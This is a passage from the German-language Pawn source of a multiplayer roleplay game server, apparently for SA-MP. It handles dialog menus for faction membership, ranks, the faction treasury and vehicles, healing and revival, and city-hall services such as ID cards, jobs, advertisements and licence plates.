				    format(stringges,sizeof stringges,"%s\n%s - Rang: %d",stringges,data,data2);
				}
			    ShowPlayerDialog(playerid,DIALOG_FRAKMENU_USER,DIALOG_STYLE_LIST,"Fraktionsliste",stringges,"Weiter","Abbrechen");
			}
			else if(listitem == 1)
			{
			    new stringges[1024];
			    for(new x = 0; x < 20; x++)
			    {
					if(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][x][FModell] > 399)
					{
                        format(stringges,sizeof stringges,"%s\n%s (Fahrzeugnummer: %d)",stringges,AutoDaten[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][x][FModell]-399][AutoName],x);
					}
			    }
			    if(strlen(stringges) < 5) return SendClientMessage(playerid,COLOR_RED,"Du hast keine Fraktionsautos!");
			    ShowPlayerDialog(playerid,DIALOG_FRAKMENU_CARS,DIALOG_STYLE_LIST,"Fahrzeugliste",stringges,"Weiter","Abbrechen");
			}
			else if(listitem == 2)
			{
			    ShowPlayerDialog(playerid,DIALOG_FRAKMENU_FRAKKASSE,DIALOG_STYLE_LIST,"Was möchtest du tun?","Geld einzahlen\nGeld auszahlen\nBetrag ansehen","Weiter","Abbrechen");
			}
			else if(listitem == 3)
			{
		    	new dialogstr[1000] = "{FF0000}Fraktions Befehle{FFFFFF}\n\n";
	        	strcat(dialogstr,"Nutze /fhelp");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
			}
			else if(listitem == 4)
			{
				new dialogstr[1000] = "{FF0000}Leader Hilfe{FFFFFF}\n\n";
            	strcat(dialogstr,"/fraktion /leader /einladen /ausladen /geberang");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Leader Befehle",dialogstr, "Schließen", "");

			}
			else if(listitem == 5)
			{
			    new str[500];
				new fraki = SpielerInfo[playerid][uLeiter];
				format(str,sizeof(str),"1. %s\n2. %s\n3. %s\n4. %s\n5. %s\n6. %s\n7. %s\n8. %s",
				Rangname[fraki][1][rangname],Rangname[fraki][2][rangname],Rangname[fraki][3][rangname],Rangname[fraki][4][rangname],Rangname[fraki][5][rangname],Rangname[fraki][6][rangname],Rangname[fraki][7][rangname],Rangname[fraki][8][rangname]);
				ShowPlayerDialog(playerid,DIALOG_RANG1,DIALOG_STYLE_LIST,"Fraktionsränge",str,"Bearbeiten","Beenden");
			}
		}
	}
	if(dialogid == DIALOG_RANG1)
	{
		if(response)
		{
		    if(listitem == 0){rangmerken[playerid] = 1;}
		    if(listitem == 1){rangmerken[playerid] = 2;}
		    if(listitem == 2){rangmerken[playerid] = 3;}
		    if(listitem == 3){rangmerken[playerid] = 4;}
		    if(listitem == 4){rangmerken[playerid] = 5;}
		    if(listitem == 5){rangmerken[playerid] = 6;}
		    if(listitem == 6){rangmerken[playerid] = 7;}
		    if(listitem == 7){rangmerken[playerid] = 8;}
		    ShowPlayerDialog(playerid,DIALOG_RANG2,DIALOG_STYLE_INPUT,"Fraktionsränge","Gebe einen neuen Rangnamen an:","Fertig","Abbrechen");
		}
	}
	if(dialogid == DIALOG_RANG2)
	{
	    if(response)
	    {
	    	format(Rangname[SpielerInfo[playerid][uLeiter]][rangmerken[playerid]][rangname],50,"%s",inputtext);
			SendFormatMessage(playerid,COLOR_GREEN,"Rang geändert in: %s",inputtext);
	    }
	}
	if(dialogid == DIALOG_FRAKMENU_USER)
	{
	    if(response == 1)
	    {
	        format(string,sizeof string,"SELECT login.Name,user.Rang,login.ID FROM `user` JOIN `login` ON user.userid=login.ID WHERE user.Mitglied='%d' OR user.Leiter='%d'",SpielerInfo[playerid][uLeiter],SpielerInfo[playerid][uLeiter]);
	    	mysql_query(dbhandle, string, true);
	    	printf("%s",string);
		    new id = 0,data[50],data2[2];
			for(new i=0; i<cache_num_rows(); i++)
			{
				if(id == listitem)
				{
				    cache_get_field_content(i, "ID", data);
				    FrakUserSelect[playerid] = strval(data);
				    cache_get_field_content(i, "Name",data);
				    cache_get_field_content(i, "Rang",data2);
				    break;
				}
				id++;
			}
			format(string,sizeof string,"Was willst du mit %s machen?",data);
			format(data,sizeof data,"Kicken\nRang setzen (%s)\nZuletzt Online",data2);
	        ShowPlayerDialog(playerid,DIALOG_FRAKMENU_USER_ACTION,DIALOG_STYLE_LIST,string,data,"Weiter","Abbrechen");
	    }
	}
	if(dialogid == DIALOG_FRAKMENU_USER_ACTION)
	{
	    if(response == 1)
	    {
	        if(listitem == 0)
	        {
	            new name[25],id;
	         	format(string,sizeof string,"ID='%d'",FrakUserSelect[playerid]);
	         	mysqlget("login",string,"Name",name);
				format(string,sizeof string,"Du hast %s aus der Fraktion geworfen!",name);
				SendClientMessage(playerid,COLOR_GREEN,string);
				id = GetPlayerID(name);
				if(id != playerid)
				{
					if(id != INVALID_PLAYER_ID)
					{
						SpielerInfo[id][uRang] = 0;
						SpielerInfo[id][uMitglied] = 0;
						SpielerInfo[id][uLeiter] = 0;
						format(string,sizeof string,"%s hat dich aus der Fraktion geworfen!",PlayerName(playerid));
						SendClientMessage(id,COLOR_LIGHTRED,string);
						format(string,sizeof string,"UPDATE `user` SET Mitglied='0',Leiter='0',Rang='0' WHERE userID='%d'",FrakUserSelect[playerid]);
						mysql_query(dbhandle, string);
						SpielerInfo[id][uSpawn] = 1;
						SendClientMessage(id,COLOR_YELLOW,"Dein Spawnort wurde geändert: Lake Sorten Motel! Ändere dein Spawnort mit /spawns");
					}
					else
					{
					    format(string,sizeof string,"UPDATE `user` SET Mitglied='0',Spawn'1',Rang='0' WHERE userID='%d'",FrakUserSelect[playerid]);
						mysql_query(dbhandle, string);
						printf("%s",string);
					}
				}else{SendClientMessage(id,COLOR_LIGHTRED,"Du kannst dich nicht selber aus der Fraktion werfen!");}
				FrakUserSelect[playerid] = 0;
	        }
	        if(listitem == 1) ShowPlayerDialog(playerid,DIALOG_FRAKMENU_USER_ACTION_RANK,DIALOG_STYLE_INPUT,"Rang setzen","Gebe den Rang an:","Bestätigen","Abbrechen");
	        if(listitem == 2)
	        {
	            format(string,sizeof string,"SELECT Name FROM `login` WHERE ID='%d'",FrakUserSelect[playerid]);
                mysql_query(dbhandle, string, true);
                printf("%s",string);
		    	new id = 0,name[25];
    			cache_get_field_content(0, "Name",name);
				id = GetPlayerID(name);
	    		if(id != INVALID_PLAYER_ID)
				{
					format(string,sizeof string,"%s ist zur Zeit online!",name);
					SendClientMessage(playerid,COLOR_GREEN,string);
				}
				else
				{
				    new zeit[10],year,month,day,hour,minute,second;
				    format(string,sizeof string,"userID='%d'",FrakUserSelect[playerid]);
				    mysqlget("user",string,"Online",zeit);
				    TimestampToDate(strval(zeit), year, month, day, hour, minute, second);
				    format(string,sizeof string,"Zuletzt Online: %02d.%02d.%d %02d:%02d",day,month,year,hour,minute);
				    SendClientMessage(playerid,COLOR_GREEN,string);
				}
    		}
		}
	}
	if(dialogid == DIALOG_FRAKMENU_USER_ACTION_RANK)
	{
	    if(response == 1)
	    {
	        new rang,id = 0,name[25];
			if(sscanf(inputtext,"i",rang)) { format(string,sizeof string,"Gebe den Rang als Zahl an zwischen 1 und 8 an!"); SendClientMessage(playerid,COLOR_RED,string); ShowPlayerDialog(playerid,DIALOG_FRAKMENU_USER_ACTION_RANK,DIALOG_STYLE_INPUT,"Rang setzen","Gebe den Rang an:","Bestätigen","Abbrechen"); return 1; }
			if(rang < 1 || rang > 8) { format(string,sizeof string,"Gebe den Rang als Zahl an zwischen 1 und 8!"); SendClientMessage(playerid,COLOR_RED,string); ShowPlayerDialog(playerid,DIALOG_FRAKMENU_USER_ACTION_RANK,DIALOG_STYLE_INPUT,"Rang setzen","Gebe den Rang an:","Bestätigen","Abbrechen"); return 1; }
            format(string,sizeof string,"SELECT Name FROM `login` WHERE ID='%d'",FrakUserSelect[playerid]);
            mysql_query(dbhandle, string, true);
            printf("%s",string);
   			cache_get_field_content(0, "Name",name);
			format(string,sizeof string,"UPDATE `user` SET Rang='%d' WHERE userID='%d'",rang,FrakUserSelect[playerid]);
   			mysql_query(dbhandle, string);
   			printf("%s",string);
			FrakUserSelect[playerid] = 0;
			id = GetPlayerID(name);
			if(id != INVALID_PLAYER_ID)
			{
				if(rang >= SpielerInfo[id][uRang])
				{
					format(string,sizeof string,"%s hat dich zu Rang %d befördert.",PlayerName(playerid),rang);
					SendClientMessage(id,COLOR_LIGHTBLUE,string);
					format(string,sizeof string,"Du hast %s zu Rang %d befördert.",name,rang);
					SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				}
				else
				{
					format(string,sizeof string,"%s hat dich zu Rang %d degradiert.",PlayerName(playerid),rang);
					SendClientMessage(id,COLOR_LIGHTBLUE,string);
					format(string,sizeof string,"Du hast %s zu Rang %d degradiert.",name,rang);
					SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				}
				SpielerInfo[id][uRang] = rang;
			}
		}
	}
	if(dialogid == DIALOG_FRAKMENU_FRAKKASSE)
	{
		if(response)
		{
		    if(listitem == 0) ShowPlayerDialog(playerid,DIALOG_FRAKMENU_FRAKKASSE_INPUT,DIALOG_STYLE_INPUT,"Fraktionskasse","Wie viel Geld willst du einzahlen?","Einzahlen","Abbrechen");
		    if(listitem == 1) ShowPlayerDialog(playerid,DIALOG_FRAKMENU_FRAKKASSE_OUTPUT,DIALOG_STYLE_INPUT,"Fraktionskasse","Wie viel Geld willst du abheben?","Abheben","Abbrechen");
		    if(listitem == 2)
			{
		 		format(string,sizeof string,"Fraktionskasse: %.2f$",Fraktionskasse[SpielerInfo[playerid][uLeiter]]);
		 		SendClientMessage(playerid,COLOR_GREEN,string);
 			}
		}
	}
	if(dialogid == DIALOG_FRAKMENU_FRAKKASSE_INPUT)
	{
	    if(response)
	    {
	        new Float:geld;
	        if(sscanf(inputtext,"f",geld) || geld < 0.01) return SendClientMessage(playerid,COLOR_RED,"Gebe einen Betrag über 0.01$ ein!");
			if(SpielerInfo[playerid][uGeld] < geld) return SendClientMessage(playerid,COLOR_RED,"So viel Geld hast du nicht bei dir!");
			GebeGeld(playerid,-geld);
			Fraktionskasse[SpielerInfo[playerid][uLeiter]]+= geld+0.0001;
			format(string,sizeof string,"Du hast %.2f$ in die Fraktionskasse eingezahlt!",geld);
			SendClientMessage(playerid,COLOR_GREEN,string);
			Frakkassespeichern(SpielerInfo[playerid][uLeiter]);
	    }
	}
	if(dialogid == DIALOG_FRAKMENU_FRAKKASSE_OUTPUT)
	{
	    if(response)
	    {
	        new Float:geld;
	        if(sscanf(inputtext,"f",geld) || geld < 0.01) return SendClientMessage(playerid,COLOR_RED,"Gebe einen Betrag über 0.01$ ein!");
			if(Fraktionskasse[SpielerInfo[playerid][uLeiter]] < geld) return SendClientMessage(playerid,COLOR_RED,"So viel Geld ist nicht in der Fraktionskasse!");
			Fraktionskasse[SpielerInfo[playerid][uLeiter]] -= geld-0.0001;
			GebeGeld(playerid,geld);
			format(string,sizeof string,"Du hast %.2f$ aus der Fraktionskasse entnommen!",geld);
			SendClientMessage(playerid,COLOR_GREEN,string);
			Frakkassespeichern(SpielerInfo[playerid][uLeiter]);
	    }
	}
	if(dialogid == DIALOG_FRAKMENU_CARS)
	{
	    if(response)
	    {
	        new id = 0;
	        for(new x = 0; x < 20; x++)
	    	{
				if(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][x][FModell] > 399)
				{
				    if(id == listitem)
				    {
				        FrakUserSelect[playerid] = x;
				        break;
				    }
					id++;
				}
			}
			if(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FAbgeschleppt] == 1)
			{
				format(string,sizeof string,"Parken\nRang zuweisen (%d)\nVerkaufen\nFreikaufen",FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRang]);
			}
			else format(string,sizeof string,"Parken\nRang zuweisen (%d)\nVerkaufen",FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRang]);
			ShowPlayerDialog(playerid,DIALOG_FRAKMENU_CARS_ACTION,DIALOG_STYLE_LIST,"Was willst du mit dem Fahrzeug machen?",string,"Weiter","Abbrechen");
	    }
	}
	if(dialogid == DIALOG_FRAKMENU_CARS_ACTION)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				GetVehiclePos(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FX],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FY],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FZ]);
				GetVehicleZAngle(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRZ]);
				DestroyVehicle(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]);
				if(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell] == 407 || FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell] == 544)
				{
				    FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID] = CreateVehicle(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FX],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FY],
					FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FZ],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRZ],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][1],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][0],-1 );
				}
				else if(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell] == 573 || FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell] == 525)
				{
					FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID] = CreateVehicle(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FX],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FY],
					FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FZ],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRZ],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][0],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][1],-1,1);
				}
				else
				{
					FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID] = CreateVehicle(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FX],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FY],
					FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FZ],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRZ],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][0],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][1],-1 );
				}
				format(string,sizeof string,"CI-%s-%d",KFZAbk[SpielerInfo[playerid][uLeiter]-1],FrakUserSelect[playerid]);
				SetVehicleNumberPlate(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID],string);
				SetVehicleToRespawn(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]);
				SendClientMessage(playerid,COLOR_GREEN,"Auto geparkt!");
				FrakAutosSpeichern(SpielerInfo[playerid][uLeiter]);
				Motorschaden2[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = 0;
	        }
	        /*if(listitem == 1)
	        {
	            if(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FReparatur] == 0) return SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug ist nicht zerstört!");
	            FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FReparatur] = 0;
	            SendClientMessage(playerid,COLOR_GREEN,"Fahrzeug repariert!");
       			FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID] = CreateVehicle(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FX],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FY],
	   			FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FZ],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRZ],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][0],FrakFahrzeugeFarben[SpielerInfo[playerid][uLeiter]][1],-1 );
        		Benzin[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = AutoDaten[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell]-399][MaxBenzin];
	 			FalscherKraftstoff[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = 0;
				Motorschaden[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = 0;
				BenzinVerbrauch[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = 0;
		 		Meter[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = 0;
		 		Meter2[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = 0;
			 	SaveCoords(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]);
			 	Blaulicht[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]] = -1;
			 	SetVehicleNumberPlate(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID],string);
	        }*/
	        if(listitem == 1)
	        {
				ShowPlayerDialog(playerid,DIALOG_FRAKMENU_CARS_RANK,DIALOG_STYLE_INPUT,"Rang","Ab welchem Rang soll man dieses Fahrzeug fahren können?","Okay","Abbrechen");
	        }
	        if(listitem == 2)
	        {
	            format(string,sizeof string,"Möchtest du den %s für %.2f$ verkaufen?",AutoDaten[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell]-399][AutoName],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FPreis]*2/3);
	            ShowPlayerDialog(playerid,DIALOG_FRAKMENU_CARS_SELL,DIALOG_STYLE_MSGBOX,"Auto-Verkauf",string,"Verkaufen","Abbrechen");
	        }
	        if(listitem == 3)
			{
                if(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FAbgeschleppt] == 0) return SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug ist nicht abgeschleppt!");
                if(Fraktionskasse[SpielerInfo[playerid][uLeiter]] < 265) return SendClientMessage(playerid,COLOR_RED,"Das Freikaufen kostet 265$!");
                FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FAbgeschleppt] = false;
                SendClientMessage(playerid,COLOR_GREEN,"Erfolgreich freigekauft!");
                Fraktionskasse[5]+=265.0;
                Fraktionskasse[SpielerInfo[playerid][uLeiter]]-=265.0;
                Frakkassespeichern(5);
                Frakkassespeichern(SpielerInfo[playerid][uLeiter]);
                FrakAutosSpeichern(SpielerInfo[playerid][uLeiter]);
			}
	    }
	}
	if(dialogid == DIALOG_FRAKMENU_CARS_RANK)
	{
	    if(response)
	    {
	        new rang;
			if(sscanf(inputtext,"d",rang) || rang < 1 || rang > 8) { format(string,sizeof string,"Gebe einen Rang zwischen 1 und 8 an!"); SendClientMessage(playerid,COLOR_RED,string); return 1; }
            FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FRang] = rang;
            format(string,sizeof string,"Du hast den Mindestrang für den %s auf %d gesetzt.",AutoDaten[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell]-399][AutoName],rang);
            SendClientMessage(playerid,COLOR_GREEN,string);
            FrakAutosSpeichern(SpielerInfo[playerid][uLeiter]);
	    }
	}
	if(dialogid == DIALOG_FRAKMENU_CARS_SELL)
	{
	    if(response)
	    {
			Fraktionskasse[SpielerInfo[playerid][uLeiter]] += FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FPreis]*2/3;
			Frakkassespeichern(SpielerInfo[playerid][uLeiter]);
			format(string,sizeof string,"DELETE FROM frakautos WHERE `carid` = '%d'",FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FSQLID]);
			printf("DELETE FROM frakautos WHERE `carid` = '%d'",FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FSQLID]);
			mysql_query(dbhandle, string);
			printf("%s",string);
			DestroyVehicle(FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID]);
			format(string,sizeof string,"%s für %.2f$ verkauft!",AutoDaten[FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell]-399][AutoName],FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FPreis]*2/3);
			SendClientMessage(playerid,COLOR_GREEN,string);
			FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FModell] = -1;
			FrakFahrzeuge[SpielerInfo[playerid][uLeiter]][FrakUserSelect[playerid]][FID] = -1;
		}
	}
	if(dialogid == DIALOG_WIEDERBELEBEN)
	{
	    if(response)
	    {
	        if(SpielerInfo[UserChoose[playerid]][uTod])
	        {
	            SpielerInfo[UserChoose[playerid]][uTod] = 0;
			    new Float:X,Float:Y,Float:Z;
			    GetPlayerPos(playerid,X,Y,Z);
			    Teleport(UserChoose[playerid],X,Y,Z);
				SetCameraBehindPlayer(UserChoose[playerid]);
				SetPlayerVirtualWorld(UserChoose[playerid],0);
				Unfreeze(UserChoose[playerid]);
				Medikamente[playerid]--;
				Fraktionskasse[3]+=250.0;
				Frakkassespeichern(3);
				ClearAnimations(UserChoose[playerid]);
	            format(string,sizeof string,"%s hat dich wiederbelebt.",PlayerName(playerid));
	            SendClientMessage(UserChoose[playerid],COLOR_GREEN,string);
	            format(string,sizeof string,"Du hast %s wiederbelebt.",PlayerName(UserChoose[playerid]));
	            SendClientMessage(playerid,COLOR_GREEN,string);
	            GebeGeld(playerid,99.8);
	        }
	    }
	}
	if(dialogid == DIALOG_HEILUNG)
	{
	    if(response)
	    {
			if(SpielerInfo[playerid][uGeld] >= Heilung[playerid][hBetrag])
			{
				GebeGeld(Heilung[playerid][hUser],Heilung[playerid][hBetrag]);
				GebeGeld(playerid,-Heilung[playerid][hBetrag]);
				GebeLeben(playerid,99.8);
				SendClientMessage(playerid,COLOR_GREEN,"Du wurdest geheilt!");
				format(string,sizeof string,"Du hast %s für %.2f$ geheilt.",PlayerName(playerid),Heilung[playerid][hBetrag]);
				SendClientMessage(Heilung[playerid][hUser],COLOR_GREEN,string);
				Verhungern[playerid] = 0;
				Medikamente[Heilung[playerid][hUser]]--;
				if(SpielerInfo[playerid][uHunger] < 2) SpielerInfo[playerid][uHunger] = 10;
				Heilung[playerid][hBetrag] = 0;
				if(SpielerInfo[playerid][uVerstrahlt] == 1)
				{
				    SpielerInfo[playerid][uVerstrahlt] = 0;
				    SendClientMessage(playerid,COLOR_GREEN,"Du bist nun nicht mehr Verstrahlt!");
				    SendFormatMessage(Heilung[playerid][hUser],COLOR_GREEN,"%s ist nun nicht mehr Verstrahlt!",PlayerName(playerid));
				    TextDrawHideForPlayer(playerid, atomtext[0]);
					TextDrawHideForPlayer(playerid, atomtext[1]);
					TextDrawHideForPlayer(playerid, atomtext[2]);
				}
				Heilung[playerid][hUser] = -1;
			}
			else SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	    }
	}
	if(dialogid == DIALOG_STADTHALLE)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
		 		if(SpielerInfo[playerid][uPerso]) SendClientMessage(playerid,COLOR_RED,"Du hast bereits einen Personalausweis!");
		 		else
		 		{
		 		    if(persobeantragt[playerid] == 0)
		 		    {
						persobeantragt[playerid] = 1;
			 		    SendClientMessage(playerid,COLOR_GREEN,"Personalausweis beantragt - In 3 Minuten ist er fertig, in dieser Zeit kannst Du dir gleich einen Job hier besorgen!");
			 		    SetTimerEx("Persoantrag",60*1000*3,0,"d",playerid);
					}else{SendClientMessage(playerid,COLOR_RED,"Du hast bereits einen Personalausweis beantragt!");}
		 		}
 			}
 			else if(listitem == 1)
 			{
 			    if(SpielerInfo[playerid][uMitglied] != 0 || SpielerInfo[playerid][uLeiter] != 0) SendClientMessage(playerid,COLOR_RED,"Du bist in einer Fraktion und kannst kein Fraktionslosengeld beantragen!");
 			    else if(SpielerInfo[playerid][uArbeitslosengeld]) SendClientMessage(playerid,COLOR_RED,"Du bekommst bereits Fraktionslosengeld!");
 			    else
 			    {
	 			    SendClientMessage(playerid,COLOR_GREEN,"Fraktionslosengeld beantragt. - Es ist ab dem nächsten PayDay erhätlich.");
					SpielerInfo[playerid][uArbeitslosengeld] = 1;
				}
 			}
 			else if(listitem == 2)
 			{
 				if(SAuto[playerid][0][sID] == -1 && SAuto[playerid][1][sID] == -1)return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein Fahrzeug!");
   				new ctext[40],dtext[40],str[100];
				if(SAuto[playerid][0][sID] == -1)
				{
    				ctext = "Keins";
				}
				else
				{
    				format(ctext,sizeof ctext,"%s",AutoDaten[GetVehicleModel(SAuto[playerid][0][sID])-399][AutoName]);
				}
				if(SAuto[playerid][1][sID] == -1)
				{
    				dtext = "Keins";
				}
				else
				{
    				format(dtext,sizeof dtext,"%s",AutoDaten[GetVehicleModel(SAuto[playerid][1][sID])-399][AutoName]);
				}
				format(str,sizeof(str),"%s\n%s",ctext,dtext);
        		ShowPlayerDialog(playerid,DIALOG_KFZ,DIALOG_STYLE_LIST,"Kennzeichen beantragen",str,"Weiter","Abbrechen");
 			}
 			else if(listitem == 3)
 			{
 			    ShowPlayerDialog(playerid,DIALOG_JOBCENTER,DIALOG_STYLE_LIST,"Welchen Job willst du machen?","Müllmann\nTaxifahrer\nBusfahrer\nFarmer\nTrucker\nHolzfäller","Weiter","Zurück");
 			}
 			else if(listitem == 4)
 			{

 			    ShowPlayerDialog(playerid,DIALOG_WERBUNG,DIALOG_STYLE_INPUT,"Werbung schreiben","Schreiben Sie Ihren Text für Ihre Werbung:","Absenden","");
 			}
	    }
	}
	if(dialogid == DIALOG_WERBUNG)
	{
		if(response)
		{
			if(SpielerInfo[playerid][uGeld] >= 100 && SpielerInfo[playerid][uLevel] > 2)
			{
				if(Werbungschreiben == 0)
				{
				    new str[140];
				    GebeGeld(playerid,-100);
					format(str,sizeof(str),"%s: %s",PlayerName(playerid),inputtext);
					TextDrawSetString(UserBr[10],str);
					SetDynamicObjectMaterialText(Werbeschild1,0, str, 120, "Gabriola", 85, 0, 0xFFFFFFFF, 0xFF0E316D, 1);
					format(string,sizeof(string),"[WERBUNG]: %s",str);
					SendClientMessageToAll(0x00BB00FF,string);
					SetTimer("Werbungreset",1000*60*30,0);
					Werbungschreiben = 1;
				}
				else SendClientMessage(playerid,COLOR_RED,"Du kannst noch keine Werbung schreiben!");
			}
			else SendClientMessage(playerid,COLOR_RED,"Die Werbung kostet 100$ und du musst mindestens Level 3 sein!");
		}
	}
	if(dialogid == DIALOG_KFZ)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            if(SAuto[playerid][0][sID] == -1)return SendClientMessage(playerid,COLOR_RED,"Du besitzt auf diesem Slot kein Fahrzeug!");
	            if(strlen(SAuto[playerid][0][sKennzeichen]) > 2) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits ein Kennzeichen!");
	            ShowPlayerDialog(playerid,DIALOG_KFZ2,DIALOG_STYLE_INPUT,"Kennzeichen beantragen","Gebe bitte zwei Buchstaben oder Zahlen für dein Kennzeichen an","Beantragen","Abbrechen");

	        }
	        if(listitem == 1)
	        {
	            if(SAuto[playerid][1][sID] == -1)return SendClientMessage(playerid,COLOR_RED,"Du besitzt auf diesem Slot kein Fahrzeug!");
	            if(strlen(SAuto[playerid][1][sKennzeichen]) > 2) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits ein Kennzeichen!");
	            ShowPlayerDialog(playerid,DIALOG_KFZ3,DIALOG_STYLE_INPUT,"Kennzeichen beantragen","Gebe bitte zwei Buchstaben oder Zahlen für dein Kennzeichen an","Beantragen","Abbrechen");
	        }
	    }
	}
	if(dialogid == DIALOG_KFZ2)
	{
		if(response)
		{
